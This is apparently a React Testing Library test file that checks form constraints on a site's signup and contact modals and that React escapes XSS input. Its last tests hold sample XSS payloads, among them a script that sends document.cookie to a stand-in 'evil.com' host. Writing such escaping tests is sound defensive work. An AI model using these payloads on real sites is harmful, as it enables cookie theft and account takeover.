/**
 * UI-layer input validation security tests (jsdom environment).
 * Verifies HTML5 form constraints and React output escaping.
 */

import React from "react";
import { render, screen, fireEvent } from "@testing-library/react";
import { ModalProvider, useModal } from "@/components/ModalContext";
import Modals from "@/components/Modals";

// ─── helpers ─────────────────────────────────────────────────────────────────

function OpenSignup() {
  const { openSignup } = useModal();
  // eslint-disable-next-line react-hooks/exhaustive-deps
  React.useEffect(() => { openSignup(); }, []);
  return <Modals />;
}

function OpenContact() {
  const { openContact } = useModal();
  // eslint-disable-next-line react-hooks/exhaustive-deps
  React.useEffect(() => { openContact(); }, []);
  return <Modals />;
}

const renderSignup = () =>
  render(<ModalProvider><OpenSignup /></ModalProvider>);

const renderContact = () =>
  render(<ModalProvider><OpenContact /></ModalProvider>);

// ─── Signup form HTML5 constraints ───────────────────────────────────────────

describe("UI – signup form HTML5 constraints", () => {
  it("email input has type=email (browser format validation)", async () => {
    renderSignup();
    const el = await screen.findByPlaceholderText("you@company.com");
    expect(el).toHaveAttribute("type", "email");
  });

  it("email input is required", async () => {
    renderSignup();
    expect(await screen.findByPlaceholderText("you@company.com")).toBeRequired();
  });

  it("password input has type=password — not plaintext", async () => {
    renderSignup();
    const el = await screen.findByPlaceholderText("Min. 8 characters");
    expect(el).toHaveAttribute("type", "password");
  });

  it("password input has minLength=8", async () => {
    renderSignup();
    const el = await screen.findByPlaceholderText("Min. 8 characters");
    expect(el).toHaveAttribute("minLength", "8");
  });

  it("name input is required", async () => {
    renderSignup();
    expect(await screen.findByPlaceholderText("Jane Smith")).toBeRequired();
  });
});

// ─── Contact form HTML5 constraints ──────────────────────────────────────────

describe("UI – contact form HTML5 constraints", () => {
  it("email input has type=email", async () => {
    renderContact();
    expect(
      await screen.findByPlaceholderText("you@company.com")
    ).toHaveAttribute("type", "email");
  });

  it("email input is required", async () => {
    renderContact();
    expect(await screen.findByPlaceholderText("you@company.com")).toBeRequired();
  });

  it("name input is required", async () => {
    renderContact();
    expect(await screen.findByPlaceholderText("Jane Smith")).toBeRequired();
  });

  it("message textarea is required", async () => {
    renderContact();
    const el = await screen.findByPlaceholderText(/Tell us about your team size/);
    expect(el).toBeRequired();
  });
});

// ─── React output escaping (XSS prevention) ──────────────────────────────────

describe("UI – React escapes XSS in input values", () => {
  it("XSS payload in name field is stored as text, not rendered as HTML", async () => {
    renderSignup();
    const input = (await screen.findByPlaceholderText("Jane Smith")) as HTMLInputElement;
    fireEvent.change(input, {
      target: { value: '<script>alert("xss")</script>' },
    });
    expect(input.value).toBe('<script>alert("xss")</script>');
    // No live <script> element injected into the DOM
    expect(document.body.querySelectorAll("script[src]").length).toBe(0);
  });

  it("XSS payload in email field does not inject DOM elements", async () => {
    renderSignup();
    const input = (await screen.findByPlaceholderText(
      "you@company.com"
    )) as HTMLInputElement;
    const payload = '<img src=x onerror="alert(1)">';
    fireEvent.change(input, { target: { value: payload } });
    expect(input.value).toBe(payload);
    // No <img> with onerror injected
    expect(document.querySelectorAll('img[onerror]').length).toBe(0);
  });

  it("XSS payload in contact message field is stored as text", async () => {
    renderContact();
    const textarea = (await screen.findByPlaceholderText(
      /Tell us about your team size/
    )) as HTMLTextAreaElement;
    const payload = '<script>fetch("//evil.com?c="+document.cookie)</script>';
    fireEvent.change(textarea, { target: { value: payload } });
    expect(textarea.value).toBe(payload);
    expect(document.body.querySelectorAll("script[src]").length).toBe(0);
  });
});
